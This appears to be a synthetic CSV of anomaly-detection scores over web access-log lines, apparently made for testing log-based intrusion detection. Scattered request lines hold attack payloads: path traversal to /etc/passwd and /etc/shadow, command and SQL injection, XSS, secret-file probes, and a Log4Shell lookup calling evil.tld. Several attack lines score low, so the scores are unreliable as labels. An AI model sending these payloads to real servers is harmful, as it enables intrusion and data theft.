score_content,score_session,score_fused,score_fused_norm,line
13.227688789367676,,13.227688789367676,13.227688789367676,173.12.123.136 - - [10/Jan/2025:12:12:50 +0000] "PUT /server-status HTTP/1.1" 204 17173 "-" "dirb/2.22"
27.628803253173828,,27.628803253173828,27.628803253173828,104.174.18.169 - - [10/Jan/2025:12:12:52 +0000] "DELETE /dashboard HTTP/1.1" 200 12961 "https://twitter.com/" "sqlmap/1.7.2#stable"
70.48585510253906,,70.48585510253906,70.48585510253906,196.76.241.39 - - [10/Jan/2025:12:12:54 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 859 "https://twitter.com/" "curl/7.85.0"
30172.091796875,,30172.091796875,30172.091796875,34.56.206.193 - - [10/Jan/2025:12:12:57 +0000] "DELETE /search?q=router HTTP/1.1" 403 1123 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
11048.7275390625,,11048.7275390625,11048.7275390625,184.217.87.174 - - [10/Jan/2025:12:12:57 +0000] "POST /search?q=headphones HTTP/1.1" 503 760 "https://example.com/" "dirb/2.22"
76.25110626220703,,76.25110626220703,76.25110626220703,204.83.243.95 - - [10/Jan/2025:12:13:00 +0000] "OPTIONS /about HTTP/1.1" 302 1649 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
4.726104736328125,,4.726104736328125,4.726104736328125,199.39.63.175 - - [10/Jan/2025:12:13:03 +0000] "GET /profile HTTP/1.1" 304 10489 "https://www.google.com/" "python-requests/2.31.0"
13.462936401367188,,13.462936401367188,13.462936401367188,210.61.12.167 - - [10/Jan/2025:12:13:05 +0000] "PUT /login HTTP/1.1" 200 14942 "https://www.google.com/" "dirb/2.22"
104.9363021850586,,104.9363021850586,104.9363021850586,212.98.26.187 - - [10/Jan/2025:12:13:08 +0000] "TRACE /login HTTP/1.1" 200 17634 "-" "python-requests/2.31.0"
30121.923828125,,30121.923828125,30121.923828125,218.97.157.109 - - [10/Jan/2025:12:13:11 +0000] "GET /assets/app.js HTTP/1.1" 400 1336 "https://twitter.com/" "sqlmap/1.7.2#stable"
2.1533687114715576,,2.1533687114715576,2.1533687114715576,246.150.102.138 - - [10/Jan/2025:12:13:11 +0000] "GET / HTTP/1.1" 200 7008 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
3.0647950172424316,,3.0647950172424316,3.0647950172424316,117.90.77.36 - - [10/Jan/2025:12:13:11 +0000] "POST /../../etc/passwd HTTP/1.1" 200 14578 "https://example.com/" "python-requests/2.31.0"
127.71369171142578,,127.71369171142578,127.71369171142578,117.22.37.214 - - [10/Jan/2025:12:13:11 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 3276 "https://news.ycombinator.com/" "curl/7.85.0"
96.26126098632812,,96.26126098632812,96.26126098632812,84.177.214.31 - - [10/Jan/2025:12:13:11 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 15386 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
96.54508972167969,,96.54508972167969,96.54508972167969,187.8.179.44 - - [10/Jan/2025:12:13:14 +0000] "OPTIONS /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 16029 "https://www.google.com/" "sqlmap/1.7.2#stable"
104.89628601074219,,104.89628601074219,104.89628601074219,30.124.200.188 - - [10/Jan/2025:12:13:15 +0000] "TRACE /logout HTTP/1.1" 200 15900 "-" "curl/7.85.0"
127.6469497680664,,127.6469497680664,127.6469497680664,155.153.168.169 - - [10/Jan/2025:12:13:17 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 7274 "https://www.google.com/" "curl/7.85.0"
73.4016342163086,,73.4016342163086,73.4016342163086,136.148.5.252 - - [10/Jan/2025:12:13:18 +0000] "OPTIONS /profile HTTP/1.1" 200 6533 "https://twitter.com/" "curl/7.85.0"
11034.65234375,,11034.65234375,11034.65234375,35.89.157.33 - - [10/Jan/2025:12:13:21 +0000] "PUT /login HTTP/1.1" 503 1208 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
0.22477954626083374,,0.22477954626083374,0.22477954626083374,126.23.38.73 - - [10/Jan/2025:12:13:24 +0000] "GET /assets/app.css HTTP/1.1" 200 18390 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
13.323934555053711,,13.323934555053711,13.323934555053711,231.40.13.234 - - [10/Jan/2025:12:13:25 +0000] "PUT /api/products HTTP/1.1" 200 2467 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
104.84693145751953,,104.84693145751953,104.84693145751953,219.65.167.39 - - [10/Jan/2025:12:13:25 +0000] "TRACE /profile HTTP/1.1" 200 10740 "https://twitter.com/" "nikto/2.5.0"
16.155656814575195,,16.155656814575195,16.155656814575195,64.242.207.46 - - [10/Jan/2025:12:13:27 +0000] "PUT /api/products HTTP/1.1" 304 2401 "https://example.com/" "dirb/2.22"
0.2283070683479309,,0.2283070683479309,0.2283070683479309,41.108.94.74 - - [10/Jan/2025:12:13:28 +0000] "GET /assets/app.css HTTP/1.1" 200 19765 "https://news.ycombinator.com/" "nikto/2.5.0"
24.758386611938477,,24.758386611938477,24.758386611938477,67.76.119.136 - - [10/Jan/2025:12:13:30 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 201 19102 "https://www.google.com/" "dirb/2.22"
96.20330047607422,,96.20330047607422,96.20330047607422,246.111.183.40 - - [10/Jan/2025:12:13:31 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 1346 "https://news.ycombinator.com/" "dirb/2.22"
127.6611328125,,127.6611328125,127.6611328125,194.71.246.35 - - [10/Jan/2025:12:13:33 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 11313 "https://example.com/" "python-requests/2.31.0"
39.105464935302734,,39.105464935302734,39.105464935302734,224.158.207.126 - - [10/Jan/2025:12:13:34 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 304 11809 "-" "dirb/2.22"
76.18325805664062,,76.18325805664062,76.18325805664062,213.63.221.92 - - [10/Jan/2025:12:13:34 +0000] "OPTIONS /contact HTTP/1.1" 302 3534 "https://twitter.com/" "nikto/2.5.0"
0.296428382396698,,0.296428382396698,0.296428382396698,156.64.108.134 - - [10/Jan/2025:12:13:35 +0000] "GET /index.html HTTP/1.1" 200 9666 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
47.74163818359375,,47.74163818359375,47.74163818359375,153.105.202.144 - - [10/Jan/2025:12:13:35 +0000] "HEAD /about HTTP/1.1" 201 4966 "https://news.ycombinator.com/" "dirb/2.22"
30126.67578125,,30126.67578125,30126.67578125,195.1.43.225 - - [10/Jan/2025:12:13:38 +0000] "POST /about HTTP/1.1" 401 980 "https://www.google.com/" "dirb/2.22"
2.1668050289154053,,2.1668050289154053,2.1668050289154053,6.57.235.188 - - [10/Jan/2025:12:13:39 +0000] "GET / HTTP/1.1" 200 10843 "https://example.com/" "sqlmap/1.7.2#stable"
0.22266660630702972,,0.22266660630702972,0.22266660630702972,65.23.187.65 - - [10/Jan/2025:12:13:41 +0000] "GET /assets/app.css HTTP/1.1" 200 17591 "https://twitter.com/" "dirb/2.22"
73.5074234008789,,73.5074234008789,73.5074234008789,35.31.12.229 - - [10/Jan/2025:12:13:41 +0000] "OPTIONS /about HTTP/1.1" 200 18200 "https://www.google.com/" "curl/7.85.0"
73.4736328125,,73.4736328125,73.4736328125,17.99.175.63 - - [10/Jan/2025:12:13:41 +0000] "OPTIONS /about HTTP/1.1" 200 7387 "https://example.com/" "sqlmap/1.7.2#stable"
73.45655059814453,,73.45655059814453,73.45655059814453,206.207.215.64 - - [10/Jan/2025:12:13:44 +0000] "OPTIONS /logout HTTP/1.1" 200 12746 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.51339721679688,,70.51339721679688,70.51339721679688,200.204.174.42 - - [10/Jan/2025:12:13:46 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2002 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.565002918243408,,4.565002918243408,4.565002918243408,63.33.132.80 - - [10/Jan/2025:12:13:46 +0000] "GET /phpmyadmin HTTP/1.1" 301 7717 "https://news.ycombinator.com/" "curl/7.85.0"
96.27202606201172,,96.27202606201172,96.27202606201172,105.16.215.34 - - [10/Jan/2025:12:13:46 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 12337 "https://example.com/" "sqlmap/1.7.2#stable"
36.250614166259766,,36.250614166259766,36.250614166259766,196.127.229.203 - - [10/Jan/2025:12:13:49 +0000] "PUT /search?q=ssd HTTP/1.1" 200 6720 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.7013872861862183,,1.7013872861862183,1.7013872861862183,230.23.120.165 - - [10/Jan/2025:12:13:52 +0000] "GET /server-status HTTP/1.1" 204 4687 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.7806077003479,,4.7806077003479,4.7806077003479,244.150.52.122 - - [10/Jan/2025:12:13:53 +0000] "POST /profile HTTP/1.1" 200 9558 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.22634954750537872,,0.22634954750537872,0.22634954750537872,246.81.124.113 - - [10/Jan/2025:12:13:53 +0000] "GET /assets/app.js HTTP/1.1" 200 11397 "https://example.com/" "dirb/2.22"
27.51398277282715,,27.51398277282715,27.51398277282715,163.173.41.148 - - [10/Jan/2025:12:13:56 +0000] "POST /search?q=headphones HTTP/1.1" 200 3508 "-" "nikto/2.5.0"
2.9682960510253906,,2.9682960510253906,2.9682960510253906,40.162.205.135 - - [10/Jan/2025:12:13:59 +0000] "GET /assets/app.js HTTP/1.1" 301 1824 "https://www.google.com/" "dirb/2.22"
73.39260864257812,,73.39260864257812,73.39260864257812,56.87.121.234 - - [10/Jan/2025:12:13:59 +0000] "OPTIONS /contact HTTP/1.1" 200 4006 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.7385311126709,,27.7385311126709,27.7385311126709,182.152.69.211 - - [10/Jan/2025:12:14:01 +0000] "DELETE /about HTTP/1.1" 200 6659 "https://twitter.com/" "nikto/2.5.0"
70.49322509765625,,70.49322509765625,70.49322509765625,234.132.86.62 - - [10/Jan/2025:12:14:02 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 2101 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
70.42530822753906,,70.42530822753906,70.42530822753906,114.73.64.70 - - [10/Jan/2025:12:14:04 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13652 "-" "dirb/2.22"
27.645545959472656,,27.645545959472656,27.645545959472656,57.69.139.22 - - [10/Jan/2025:12:14:06 +0000] "DELETE /dashboard HTTP/1.1" 200 18886 "https://example.com/" "python-requests/2.31.0"
27.64337158203125,,27.64337158203125,27.64337158203125,58.35.41.199 - - [10/Jan/2025:12:14:09 +0000] "POST /search?q=phone HTTP/1.1" 200 17427 "https://twitter.com/" "nikto/2.5.0"
11.955953598022461,,11.955953598022461,11.955953598022461,165.233.226.225 - - [10/Jan/2025:12:14:09 +0000] "PUT /.env HTTP/1.1" 200 3040 "https://twitter.com/" "python-requests/2.31.0"
46.301151275634766,,46.301151275634766,46.301151275634766,158.159.191.104 - - [10/Jan/2025:12:14:09 +0000] "HEAD /.env HTTP/1.1" 200 11940 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
47.7584342956543,,47.7584342956543,47.7584342956543,25.29.234.204 - - [10/Jan/2025:12:14:09 +0000] "HEAD /login HTTP/1.1" 201 9602 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.682640075683594,,24.682640075683594,24.682640075683594,175.228.71.179 - - [10/Jan/2025:12:14:09 +0000] "GET /search?q=monitor HTTP/1.1" 200 6527 "https://news.ycombinator.com/" "python-requests/2.31.0"
13.437200546264648,,13.437200546264648,13.437200546264648,195.81.145.199 - - [10/Jan/2025:12:14:10 +0000] "PUT /logout HTTP/1.1" 200 18439 "https://www.google.com/" "python-requests/2.31.0"
130.51011657714844,,130.51011657714844,130.51011657714844,175.91.116.168 - - [10/Jan/2025:12:14:12 +0000] "TRACE /search?q=router HTTP/1.1" 304 6493 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
70.52812957763672,,70.52812957763672,70.52812957763672,235.143.162.178 - - [10/Jan/2025:12:14:12 +0000] "HEAD /search?q=camera HTTP/1.1" 200 12994 "https://example.com/" "curl/7.85.0"
24.7091121673584,,24.7091121673584,24.7091121673584,142.183.78.44 - - [10/Jan/2025:12:14:14 +0000] "GET /search?q=camera HTTP/1.1" 200 8725 "-" "Wget/1.21.2 (linux-gnu)"
2.1412370204925537,,2.1412370204925537,2.1412370204925537,125.182.6.238 - - [10/Jan/2025:12:14:15 +0000] "GET / HTTP/1.1" 200 3547 "https://www.google.com/" "sqlmap/1.7.2#stable"
13.38791561126709,,13.38791561126709,13.38791561126709,102.242.94.55 - - [10/Jan/2025:12:14:18 +0000] "PUT /contact HTTP/1.1" 200 12955 "https://twitter.com/" "dirb/2.22"
0.32481271028518677,,0.32481271028518677,0.32481271028518677,175.16.64.132 - - [10/Jan/2025:12:14:20 +0000] "GET /index.html HTTP/1.1" 200 19265 "-" "dirb/2.22"
50.5943489074707,,50.5943489074707,50.5943489074707,5.216.105.175 - - [10/Jan/2025:12:14:21 +0000] "DELETE /search?q=ssd HTTP/1.1" 201 19684 "-" "Wget/1.21.2 (linux-gnu)"
30158.173828125,,30158.173828125,30158.173828125,31.247.93.129 - - [10/Jan/2025:12:14:23 +0000] "PUT /search?q=router HTTP/1.1" 403 545 "https://twitter.com/" "curl/7.85.0"
99.11494445800781,,99.11494445800781,99.11494445800781,51.126.140.213 - - [10/Jan/2025:12:14:23 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 301 17272 "https://www.google.com/" "curl/7.85.0"
1.9854110479354858,,1.9854110479354858,1.9854110479354858,244.181.222.54 - - [10/Jan/2025:12:14:25 +0000] "GET /login HTTP/1.1" 200 17827 "https://twitter.com/" "dirb/2.22"
30122.28125,,30122.28125,30122.28125,155.14.133.119 - - [10/Jan/2025:12:14:25 +0000] "GET /index.html HTTP/1.1" 404 107 "https://www.google.com/" "curl/7.85.0"
1.9406981468200684,,1.9406981468200684,1.9406981468200684,134.141.139.120 - - [10/Jan/2025:12:14:26 +0000] "GET /about HTTP/1.1" 200 4058 "https://www.google.com/" "curl/7.85.0"
11071.767578125,,11071.767578125,11071.767578125,114.91.215.115 - - [10/Jan/2025:12:14:28 +0000] "DELETE /search?q=headphones HTTP/1.1" 503 921 "https://www.google.com/" "python-requests/2.31.0"
26.0819149017334,,26.0819149017334,26.0819149017334,182.91.81.19 - - [10/Jan/2025:12:14:30 +0000] "DELETE /.git/config HTTP/1.1" 200 17380 "https://twitter.com/" "sqlmap/1.7.2#stable"
73.39093780517578,,73.39093780517578,73.39093780517578,105.22.27.220 - - [10/Jan/2025:12:14:30 +0000] "OPTIONS /api/products HTTP/1.1" 200 446 "https://example.com/" "dirb/2.22"
16.054933547973633,,16.054933547973633,16.054933547973633,25.220.247.184 - - [10/Jan/2025:12:14:32 +0000] "PUT /phpmyadmin HTTP/1.1" 302 3167 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.7186318635940552,,1.7186318635940552,1.7186318635940552,75.212.104.2 - - [10/Jan/2025:12:14:32 +0000] "GET /server-status HTTP/1.1" 200 7885 "-" "dirb/2.22"
30121.98828125,,30121.98828125,30121.98828125,109.168.123.136 - - [10/Jan/2025:12:14:32 +0000] "GET /index.html HTTP/1.1" 400 1372 "-" "nikto/2.5.0"
11023.3056640625,,11023.3056640625,11023.3056640625,156.48.234.231 - - [10/Jan/2025:12:14:33 +0000] "GET / HTTP/1.1" 503 1033 "-" "nikto/2.5.0"
24.86583137512207,,24.86583137512207,24.86583137512207,13.228.173.82 - - [10/Jan/2025:12:14:34 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 2528 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.186835765838623,,2.186835765838623,2.186835765838623,154.15.88.73 - - [10/Jan/2025:12:14:36 +0000] "GET / HTTP/1.1" 200 17579 "https://www.google.com/" "nikto/2.5.0"
104.75741577148438,,104.75741577148438,104.75741577148438,68.120.186.165 - - [10/Jan/2025:12:14:38 +0000] "TRACE /dashboard HTTP/1.1" 200 2415 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.27680298686027527,,0.27680298686027527,0.27680298686027527,9.93.48.130 - - [10/Jan/2025:12:14:40 +0000] "GET /index.html HTTP/1.1" 200 4184 "https://news.ycombinator.com/" "nikto/2.5.0"
105.97958374023438,,105.97958374023438,105.97958374023438,47.232.69.44 - - [10/Jan/2025:12:14:41 +0000] "TRACE /wp-login.php HTTP/1.1" 302 5818 "https://twitter.com/" "nikto/2.5.0"
47.519344329833984,,47.519344329833984,47.519344329833984,22.113.171.92 - - [10/Jan/2025:12:14:42 +0000] "HEAD /server-status HTTP/1.1" 200 8044 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.24222606420516968,,0.24222606420516968,0.24222606420516968,16.76.157.81 - - [10/Jan/2025:12:14:45 +0000] "GET /assets/app.js HTTP/1.1" 200 16720 "https://www.google.com/" "curl/7.85.0"
50.57052993774414,,50.57052993774414,50.57052993774414,187.132.163.187 - - [10/Jan/2025:12:14:47 +0000] "DELETE /api/product?id=123 HTTP/1.1" 204 13387 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.807613372802734,,50.807613372802734,50.807613372802734,227.163.234.86 - - [10/Jan/2025:12:14:49 +0000] "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17376 "https://news.ycombinator.com/" "python-requests/2.31.0"
96.1853256225586,,96.1853256225586,96.1853256225586,218.175.64.211 - - [10/Jan/2025:12:14:52 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 11295 "https://news.ycombinator.com/" "curl/7.85.0"
0.243612140417099,,0.243612140417099,0.243612140417099,241.137.254.135 - - [10/Jan/2025:12:14:53 +0000] "GET /assets/app.js HTTP/1.1" 200 17229 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
70.54485321044922,,70.54485321044922,70.54485321044922,53.97.131.188 - - [10/Jan/2025:12:14:54 +0000] "HEAD /search?q=phone HTTP/1.1" 200 11936 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
36.20349884033203,,36.20349884033203,36.20349884033203,161.14.93.250 - - [10/Jan/2025:12:14:54 +0000] "PUT /search?q=router HTTP/1.1" 200 11968 "-" "Wget/1.21.2 (linux-gnu)"
127.59814453125,,127.59814453125,127.59814453125,9.119.66.198 - - [10/Jan/2025:12:14:56 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 6234 "-" "nikto/2.5.0"
36.18797302246094,,36.18797302246094,36.18797302246094,128.161.29.102 - - [10/Jan/2025:12:14:57 +0000] "PUT /search?q=laptop HTTP/1.1" 200 7439 "https://twitter.com/" "nikto/2.5.0"
50.50363540649414,,50.50363540649414,50.50363540649414,225.97.103.145 - - [10/Jan/2025:12:14:58 +0000] "DELETE /search?q=laptop HTTP/1.1" 201 10871 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
7.581445693969727,,7.581445693969727,7.581445693969727,58.92.216.171 - - [10/Jan/2025:12:15:01 +0000] "POST /logout HTTP/1.1" 302 2240 "https://twitter.com/" "sqlmap/1.7.2#stable"
70.49666595458984,,70.49666595458984,70.49666595458984,152.141.75.96 - - [10/Jan/2025:12:15:03 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 3969 "https://www.google.com/" "curl/7.85.0"
30172.130859375,,30172.130859375,30172.130859375,212.139.251.112 - - [10/Jan/2025:12:15:05 +0000] "DELETE /search?q=phone HTTP/1.1" 403 386 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
96.3665771484375,,96.3665771484375,96.3665771484375,180.116.172.87 - - [10/Jan/2025:12:15:06 +0000] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 12067 "https://www.google.com/" "sqlmap/1.7.2#stable"
30.450416564941406,,30.450416564941406,30.450416564941406,210.137.192.64 - - [10/Jan/2025:12:15:06 +0000] "POST /search?q=router HTTP/1.1" 304 14372 "-" "dirb/2.22"
39.0131950378418,,39.0131950378418,39.0131950378418,58.160.57.14 - - [10/Jan/2025:12:15:09 +0000] "PUT /search?q=phone HTTP/1.1" 302 9008 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
127.66173553466797,,127.66173553466797,127.66173553466797,11.21.249.130 - - [10/Jan/2025:12:15:12 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 6326 "https://www.google.com/" "nikto/2.5.0"
47.7874755859375,,47.7874755859375,47.7874755859375,229.156.74.32 - - [10/Jan/2025:12:15:13 +0000] "HEAD /login HTTP/1.1" 200 18725 "https://example.com/" "curl/7.85.0"
27.599519729614258,,27.599519729614258,27.599519729614258,136.86.113.91 - - [10/Jan/2025:12:15:15 +0000] "POST /search?q=router HTTP/1.1" 200 9652 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.0570695400238037,,3.0570695400238037,3.0570695400238037,88.26.37.73 - - [10/Jan/2025:12:15:15 +0000] "GET /assets/app.css HTTP/1.1" 304 18731 "https://www.google.com/" "nikto/2.5.0"
27.797056198120117,,27.797056198120117,27.797056198120117,242.245.197.1 - - [10/Jan/2025:12:15:18 +0000] "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 15603 "https://twitter.com/" "dirb/2.22"
24.866121292114258,,24.866121292114258,24.866121292114258,199.83.141.2 - - [10/Jan/2025:12:15:21 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 1924 "https://twitter.com/" "nikto/2.5.0"
47.50125503540039,,47.50125503540039,47.50125503540039,204.147.36.244 - - [10/Jan/2025:12:15:23 +0000] "HEAD /server-status HTTP/1.1" 200 2441 "https://www.google.com/" "dirb/2.22"
73.27981567382812,,73.27981567382812,73.27981567382812,205.167.145.242 - - [10/Jan/2025:12:15:24 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 15361 "https://example.com/" "sqlmap/1.7.2#stable"
4.779909610748291,,4.779909610748291,4.779909610748291,186.93.249.51 - - [10/Jan/2025:12:15:26 +0000] "POST /profile HTTP/1.1" 200 9356 "https://example.com/" "curl/7.85.0"
96.2464370727539,,96.2464370727539,96.2464370727539,109.119.52.242 - - [10/Jan/2025:12:15:28 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 10645 "https://www.google.com/" "sqlmap/1.7.2#stable"
11057.48828125,,11057.48828125,11057.48828125,64.200.233.229 - - [10/Jan/2025:12:15:28 +0000] "PUT /search?q=router HTTP/1.1" 503 175 "-" "curl/7.85.0"
127.59770965576172,,127.59770965576172,127.59770965576172,108.122.188.148 - - [10/Jan/2025:12:15:30 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 843 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.62680435180664,,47.62680435180664,47.62680435180664,196.121.231.72 - - [10/Jan/2025:12:15:31 +0000] "HEAD /dashboard HTTP/1.1" 200 8958 "https://twitter.com/" "curl/7.85.0"
7.571628093719482,,7.571628093719482,7.571628093719482,187.141.120.162 - - [10/Jan/2025:12:15:31 +0000] "POST /dashboard HTTP/1.1" 304 16824 "https://www.google.com/" "python-requests/2.31.0"
96.26459503173828,,96.26459503173828,96.26459503173828,114.52.206.66 - - [10/Jan/2025:12:15:34 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 16554 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
24.692834854125977,,24.692834854125977,24.692834854125977,161.83.248.77 - - [10/Jan/2025:12:15:36 +0000] "GET /search?q=laptop HTTP/1.1" 200 4226 "https://www.google.com/" "python-requests/2.31.0"
2.1701345443725586,,2.1701345443725586,2.1701345443725586,112.96.16.136 - - [10/Jan/2025:12:15:39 +0000] "GET / HTTP/1.1" 200 11867 "-" "python-requests/2.31.0"
4.784132957458496,,4.784132957458496,4.784132957458496,218.227.241.104 - - [10/Jan/2025:12:15:41 +0000] "POST /profile HTTP/1.1" 200 10598 "https://example.com/" "python-requests/2.31.0"
73.50531768798828,,73.50531768798828,73.50531768798828,103.92.64.163 - - [10/Jan/2025:12:15:41 +0000] "OPTIONS /login HTTP/1.1" 200 17411 "https://twitter.com/" "curl/7.85.0"
27.5821475982666,,27.5821475982666,27.5821475982666,197.247.180.215 - - [10/Jan/2025:12:15:43 +0000] "POST /search?q=laptop HTTP/1.1" 200 1092 "https://www.google.com/" "nikto/2.5.0"
39.08190155029297,,39.08190155029297,39.08190155029297,66.144.246.151 - - [10/Jan/2025:12:15:46 +0000] "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 18248 "https://twitter.com/" "sqlmap/1.7.2#stable"
99.00473022460938,,99.00473022460938,99.00473022460938,66.95.1.220 - - [10/Jan/2025:12:15:49 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 304 3397 "-" "sqlmap/1.7.2#stable"
11.737716674804688,,11.737716674804688,11.737716674804688,148.225.84.107 - - [10/Jan/2025:12:15:50 +0000] "PUT /.git/config HTTP/1.1" 200 4936 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.877844333648682,,4.877844333648682,4.877844333648682,75.91.226.7 - - [10/Jan/2025:12:15:51 +0000] "POST /admin HTTP/1.1" 200 19027 "https://news.ycombinator.com/" "dirb/2.22"
47.761024475097656,,47.761024475097656,47.761024475097656,30.146.19.29 - - [10/Jan/2025:12:15:52 +0000] "HEAD /login HTTP/1.1" 200 9851 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
99.08047485351562,,99.08047485351562,99.08047485351562,188.90.16.212 - - [10/Jan/2025:12:15:55 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 302 19975 "-" "nikto/2.5.0"
73.40313720703125,,73.40313720703125,73.40313720703125,41.233.135.190 - - [10/Jan/2025:12:15:55 +0000] "OPTIONS /contact HTTP/1.1" 201 7415 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
45.89590072631836,,45.89590072631836,45.89590072631836,216.233.93.98 - - [10/Jan/2025:12:15:58 +0000] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 12784 "https://www.google.com/" "nikto/2.5.0"
0.19381475448608398,,0.19381475448608398,0.19381475448608398,183.230.244.92 - - [10/Jan/2025:12:16:00 +0000] "GET /assets/app.css HTTP/1.1" 200 8284 "https://news.ycombinator.com/" "dirb/2.22"
